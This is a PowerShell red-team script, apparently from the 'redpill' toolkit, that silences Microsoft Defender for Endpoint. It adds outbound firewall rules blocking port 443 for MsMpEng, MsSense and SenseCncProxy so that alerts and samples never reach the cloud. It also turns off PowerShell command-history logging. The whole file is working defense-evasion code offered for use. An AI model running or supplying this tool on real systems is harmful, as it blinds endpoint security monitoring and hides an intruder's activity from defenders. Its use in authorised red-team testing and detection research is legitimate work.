<#
.SYNOPSIS
   Silencing microsoft defender using firewall rules!

   Author: @r00t-3xp10it
   Credits to: csis-techblog
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Administrator privileges
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.6

.DESCRIPTION
   Windows Defender for Endpoint (formerly Windows Defender ATP) is a so-called �cloud powered� EDR product,
   i.e. alerts and events are pushed to the cloud where defenders can respond to them. When doing Red Team
   assignments one of the biggest hurdles usually lie in evading EDR products and ensuring that our actions
   are not detected. While a lot of work and research has been put into evading and bypassing Windows Defender
   for Endpoint, little research explores the possibility of simply silencing MD for Endpoint such that no data
   is sent to the cloud.

.NOTES
   This cmdlet stops Microsoft Defender from sending samples (suspicious samples) to Microsoft cloud
   by blocking defender connections to the could using firewall outbound Block rules, but once those
   rules are removed the events and alerts will start showing up in Microsoft Defender security center

.Parameter Action
   Accepts arguments: query, silence, delete (default: query)

.Parameter DisplayName
   The firewall rule DisplayName to query\delete (default: false)

.EXAMPLE
   PS C:\> Get-Help .\SilenceDefender_ATP.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action query
   List all 'active' firewall rules on remote system

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action query -DisplayName "Block 443"
   Query for 'Block 443' active firewall rules strings

.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Silence
   Silence Microsoft defender from sending samples to the cloud.
   
.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Delete
   Delete the 'Block' rules added previously by the 'silence' function
   
.EXAMPLE
   PS C:\> .\SilenceDefender_ATP.ps1 -Action Delete -DisplayName "Block 443 MsMpEng"
   Delete the 'Block 443 MsMpEng' firewall rule displayname.

.INPUTS
   None. You cannot pipe objects into SilenceDefender.ps1

.OUTPUTS
   * Quering enabled firewall rules.
   Enabled Action Direction DisplayName                                                                                              
   ------- ------ --------- -----------                                                                                              
      True  Allow   Inbound Otimiza��o da Entrega (TCP-In)                                                                           
      True  Allow   Inbound Otimiza��o da Entrega (UDP-In)                                                                           
      True  Allow   Inbound Plataforma de Dispositivos Ligados (TCP de Entrada)                                                      
      True  Allow  Outbound Plataforma de Dispositivos Ligados (TCP de Sa�da)  
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://www.cloudsavvyit.com/4269/managing-firewall-rules-with-powershell-in-windows
   https://medium.com/csis-techblog/silencing-microsoft-defender-for-endpoint-using-firewall-rules-3839a8bf8d18
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$DisplayName="False",
   [string]$Action="Query"
)


Write-Host ""
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption �HistorySaveStyle SaveNothing|Out-Null
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


If($Action -ieq "Query")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Query 'ALL' active rules or just 'DisplayName' rule!
   #>

   #Quering enabled firewall rules
   Write-Host "`n* Quering enabled firewall rules" -ForegroundColor Blue
   If($DisplayName -ieq "False")
   {
      #Query ALL active firewall rules
      $QueryRules = Get-NetFirewallRule | Where-Object {
         $_.Action -iMatch '^(Allow|Block)$' -and $_.Enabled -iMatch '^(True)$' -and
         $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)'
      } | Format-Table Enabled,Action,Direction,DisplayName -AutoSize
   }
   Else
   {
      #Query sellected DisplayName firewall rule
      $QueryRules = Get-NetFirewallRule | Where-Object {
         $_.Action -iMatch '^(Allow|Block)$' -and $_.Enabled -iMatch '^(True)$' -and $_.DisplayName -iMatch "$DisplayName" -and
         $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)'
      } | Format-Table Enabled,Action,Direction,DisplayName -AutoSize
   }

}


If($Action -ieq "Silence")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Silence Microsoft Defender from sending samples to the cloud!

   .NOTES
      Administrator privileges required to add firewall rules!
   #>

   If(-not($IsClientAdmin))
   {
      Write-Host "`n* Silence Defender from sending samples to the cloud!" -ForegroundColor Blue
      Write-Host "   Error: Administrator privileges required .." -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";Exit #Exit SilenceDefender_ATP
   }

   Write-Host "`n* Silence Defender from sending samples to the cloud!" -ForegroundColor Blue
   New-NetFirewallRule -DisplayName "Block 443 MsMpEng" -Name "Block 443 MsMpEng" -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block|Out-Null
   New-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -Name "Block 443 SenseCncProxy" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" -RemotePort 443 -Protocol TCP -Action Block|Out-Null
   New-NetFirewallRule -DisplayName "Block 443 MsSense" -Name "Block 443 MsSense" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" -RemotePort 443 -Protocol TCP -Action Block|Out-Null

   Start-Sleep -Milliseconds 700
   #Check if the rules was successfuly added
   $QueryRules = Get-NetFirewallRule | Where-Object {
      $_.Action -iMatch '^(Block)$' -and $_.DisplayName -Match '^(Block 443)' -and
      $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)'
   } | Format-Table Enabled,Action,Direction,DisplayName,Status -AutoSize

}


If($Action -ieq "Delete")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete firewall rules added by this cmdlet OR by is DisplayName!

   .NOTES
      Administrator privileges required to delete firewall rules!
      This function deletes firewall rules added by this cmdlet
      (silence function) Or delete sellected rule by is DisplayName.
   #>

   If(-not($IsClientAdmin))
   {
      Write-Host "`n* Removing microsoft defender firewall rules!" -ForegroundColor Blue
      Write-Host "   Error: Administrator privileges required .." -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";Exit #Exit SilenceDefender_ATP
   }

   If($DisplayName -ieq "False")
   {
      try{#Removing microsoft defender firewall rules!
         Write-Host "`n* Removing microsoft defender firewall rules!" -ForegroundColor Blue
         Remove-NetFirewallRule -DisplayName "Block 443 MsMpEng"
         Remove-NetFirewallRule -DisplayName "Block 443 MsSense"   
         Remove-NetFirewallRule -DisplayName "Block 443 SenseCncProxy"
      }catch{
         Write-Host "   Error: fail to remove firewall rule(s) .." -ForegroundColor Red -BackgroundColor Black
      }
   }
   Else
   {
      try{#Delete firewall rule by is DisplayName!
         Write-Host "`n* Deleting '$DisplayName' firewall rule!" -ForegroundColor Blue
         Remove-NetFirewallRule -DisplayName "$DisplayName"
      }catch{
         Write-Host "   Error: fail to delete '$DisplayName' firewall rule .." -ForegroundColor Red -BackgroundColor Black
      }
   }

   #Query firewall rules
   Start-Sleep -Milliseconds 700
   $QueryRules = Get-NetFirewallRule | Where-Object {
      $_.Action -iMatch '^(Allow|Block)$' -and $_.Enabled -iMatch '^(True)$' -and
      $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)'
   } | Format-Table Enabled,Action,Direction,DisplayName -AutoSize

}



If($QueryRules)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display Onscreen Output Table!
   #>

   echo $QueryRules | Format-Table -AutoSize | Out-String -Stream | Select -Skip 1 | ForEach-Object {
      $stringformat = If($_ -Match '^(Enabled)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match 'Block')
      {
         @{ 'ForegroundColor' = 'Red' }      
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }
}
Else
{
   Write-Host "   Error: None firewall rule found matching the criteria entered!" -ForegroundColor Red -BackgroundColor Black
   Write-Host ""
}